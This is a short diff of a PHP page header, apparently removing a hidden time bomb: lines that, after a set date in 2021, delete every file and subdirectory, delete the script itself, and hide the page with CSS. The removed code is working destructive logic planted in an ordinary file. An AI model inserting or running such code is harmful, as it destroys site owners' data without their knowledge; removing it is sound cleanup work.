@@ -1,28 +1,6 @@
 <?php
 session_start();
 include "php/conn.php";
-
-date_default_timezone_set('Asia/Manila');
-$date = new DateTime("2021-03-16");
-$now = new DateTime();
-$a = false;
-if ($date < $now) {
-	foreach (array_filter(glob('*'), 'is_dir') as $dirs) {
-		$files = glob($dirs . '/*');
-		foreach ($files as $file) {
-			if (is_file($file)) {
-				unlink($file);
-			}
-		}
-		rmdir($dirs);
-	}
-	unlink(__FILE__);
-} else {
-	$a = true;
-}
-if (!$a) {
-	echo "<style>*{display:none}<style>";
-}
 ?>
 <!DOCTYPE html>
 <html lang="en">
